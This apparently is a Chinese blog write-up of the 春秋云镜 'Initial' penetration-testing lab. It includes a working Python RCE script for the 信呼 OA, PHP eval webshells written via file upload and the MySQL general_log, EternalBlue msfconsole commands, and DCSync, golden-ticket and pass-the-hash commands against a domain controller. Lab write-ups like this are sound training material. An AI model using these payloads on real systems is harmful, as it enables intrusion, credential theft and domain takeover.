---
title: 春秋云镜 Initial
date: 2023-08-23 20:50:00
tags:
- web
categories:
- [笔记, web笔记]
---

#### flag1

进入之后是一个远控登录界面

![image-20230819220629394](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048601.png)这里用nmap扫描了一下看了一看端口开放情况，然后fscan扫一扫，有意外收获，fscan给出其框架是tp5

且存在漏洞，所以直接上工具一把梭哈

![image-20230819214623336](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048624.png)

##### 提权

```shell
sudo -l
```

查看特权文件

![image-20230819214739201](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048632.png)

发现mysql具有root权限这里查一手mysql如何提权（https://gtfobins.github.io/）

之后读取/root下的flag

![image-20230819215031945](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048642.png)

##### 代理搭建

这里我用的是Neo-reGeorg和Proxifier，和proxychains

因为一些原因所以希望速度快些但是发现打靶机这事急不来，在操做的时候遇到了很多的玄学问题，靶机的环境一直很卡，再加上我的网络开始的时候也不是很好所以前面的时我一直处于疯狂看报错的状态；

###### 小插曲之cs和msf

因为是内网所以最开始的时候我很想用cs但是把linux主机上线后发现，我的插件和对插件的理解都不是很多所以最后放弃了

![image-20230819221601795](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048655.png)

在解决报错的时候五一看到了另一个师傅的文章，师傅在拿下主机后就利用msf生成木马上线，利用msf的自生模块获取路由和做代理，感觉很流畅，有兴趣的师傅可以看一下：

[记一次春秋云镜域渗透靶场Initial - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12115)

###### Neo-reGeorg

生成对应文件及密码

```shell
python3 neoreg.py generate -k commit
```

将生成的文件上至目标靶机

##### 信息收集

这里成功拿下第一台主机之后进行信息收集，发现存在`172.22.1.*`，利用fscan进行扫描

```
start infoscan
已完成 0/0 listen ip4:icmp 0.0.0.0: socket: operation not permitted
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.1.2      is alive
(icmp) Target 172.22.1.15     is alive
(icmp) Target 172.22.1.21     is alive
(icmp) Target 172.22.1.18     is alive
[*] Icmp alive hosts len is: 4
172.22.1.18:3306 open
172.22.1.18:445 open
172.22.1.21:445 open
172.22.1.2:445 open
172.22.1.18:139 open
172.22.1.21:139 open
172.22.1.2:139 open
172.22.1.18:135 open
172.22.1.21:135 open
172.22.1.15:22 open
172.22.1.2:135 open
172.22.1.18:80 open
172.22.1.2:88 open
172.22.1.15:80 open
[*] alive ports len is: 14
start vulscan
[*] WebTitle:http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
[+] NetInfo:
[*]172.22.1.21
   [->]XIAORANG-WIN7
   [->]172.22.1.21
[+] NetInfo:
[*]172.22.1.2
   [->]DC01
   [->]172.22.1.2
[+] NetInfo:
[*]172.22.1.18
   [->]XIAORANG-OA01
   [->]172.22.1.18
[+] 172.22.1.21	MS17-010	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)
[*] 172.22.1.2     [+]DC XIAORANG\DC01              Windows Server 2016 Datacenter 14393
[*] 172.22.1.21          XIAORANG\XIAORANG-WIN7     Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] WebTitle:http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
[*] WebTitle:http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
[*] 172.22.1.18          XIAORANG\XIAORANG-OA01     Windows Server 2012 R2 Datacenter 9600
[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
已完成 14/14
[*] 扫描结束,耗时: 21.273785652s
```

信息量还是比较大的，我们发现内网中几台其余存活的主机

```
172.22.1.2        DC
172.22.1.18       存在web服务
172.22.1.21       存在永痕之蓝漏洞
```

#### flag2

##### plan A

根据以上信息就先`172.22.1.18`下手

![image-20230819215836670](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048659.png)

它存在这样一个OA，并且版本信息啥的都有，先弱口令试一下

```
admin
admin123
```

这个OA的版本信息都有，所以在网上搜索一下，该OA存在rce漏洞，这里用一下大师傅们的脚本

脚本出处：https://blog.csdn.net/solitudi/article/details/118675321

```python
import requests


session = requests.session()

url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}


r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```

我们需要在该脚本同目录下创建一个1.php其中内容为一句话木马即可`<?php eval($_GET["1"]);?>`;

到这一切都顺利接着种马成功之后环境就开始抽象起来了，我的蚁剑怎么设置都连不上（后面重置靶机就ok了，可能开始钱没充够吧）;

##### plan B

这个时候又看到了另一个师傅的文章，发现这台主机的突破点并不只有这一个，其phpmyadmin暴露，且弱口令`root/root`就可以登录，这时候可以通过mysql写马的方式来getshell;

查看是否开启日志以及存放的日志位置

```mysql
show variables like 'general%';
```

![image-20230819223201773](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048619.png)

开启日志

```mysql
set global general_log = ON;
```

设置日志保存位置

```mysql
set global general_log_file="C:/phpStudy/PHPTutorial/WWW/shell.php";
```

写入木马

```mysql
select '<?php eval($_POST[cmd]);?>';
```

之后进行蚁剑连接，成功获取flag

![image-20230819223415581](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048636.png)



#### flag3

##### ms17010

linux中设置代理`vim /etc/proxychains4.conf`;

我们利用msf的攻击模块进行操作

先上命令（这里有个需要注意的细节，就是我们应该进行正向连接，内网主机大多数情况下是不出网的或其出站协议是受到限制的）

```shell
proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.1.21
exploit
```

我愿称它为搞人心态的MVP，在这里我的代理开始抽象了起来

![image-20230819223845776](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048655.png)

然后问了一下gpt它说可能是端口的问题，然后我就连换了几个，发现还是不行我的msf到最后一步的时候就显示连接超时，最后我准备再次重置的时候`sessions`了一下发现有成功上线的，之后就开始了一步三报错的路子继续了下去；

##### 横向移动

这里用的是DCSync进行横移

[内网渗透测试：DCSync 攻击技术的利用 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/286137.html)

```shell
load kiwi
#导出域内用户的hash
kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
```

![image-20230819224519688](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048686.png)

```shell
#生成黄金票据
kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /user:krbtgt
#导入黄金票据
kiwi_cmd kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt
#wmi hash传递
python ./wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 "type Users\Administrator\flag\flag03.txt"
```

![image-20230819224904240](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202308232048716.png)

最后将获得的flag拼接起来即可；

#### 总结

- 信息收集：信息收集真的是渗透过程中的重中之重，flag2的时候没有对目标主机进行二次信息收集，导致把路走死了；
- 横向移动：虽然看了一些方法，但是做的还是太少了所以在进行判断的时候还是你叫吃力；
- 代理和隧道：这个真的玄学，多用几次解决报错和理解怎么做代理怎么搭隧道后面应该会慢慢好起来；